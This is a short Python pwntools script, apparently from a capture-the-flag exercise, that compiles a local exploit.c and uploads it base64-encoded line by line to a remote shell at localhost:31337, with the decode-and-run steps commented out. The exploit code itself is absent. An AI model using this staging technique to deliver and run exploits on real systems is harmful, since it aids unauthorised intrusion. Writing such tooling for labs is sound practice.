from pwn import *
import os

p = remote('localhost', 31337)

log.info("compiling")
os.system('musl-gcc -static -o exploit exploit.c')

log.info("base64ing")
os.system("base64 exploit > b64expl")

log.info("wait server booting")
sleep(30)

log.info('sending exploit...')
p.sendlineafter(b"$ ", b"cd /home/blud")
c = 1
f = open("b64expl","r")
while True:
    if c % 0x20 == 0:
        print("line ", hex(c))
    line = f.readline().replace('\n','')
    if len(line) <= 0:
        break
    data = b"echo '" + line.encode() + b"' >> b64exploit;"
    p.sendlineafter(b"$ ", data)
    c += 1

#p.sendlineafter(b"$ ", b"base64 -d b64exploit > exploit")
#p.sendlineafter(b"$ ", b"chmod +x exploit")
#p.sendlineafter(b"$ ", b"./exploit")

os.unlink("b64expl")
os.unlink("exploit")

p.interactive()
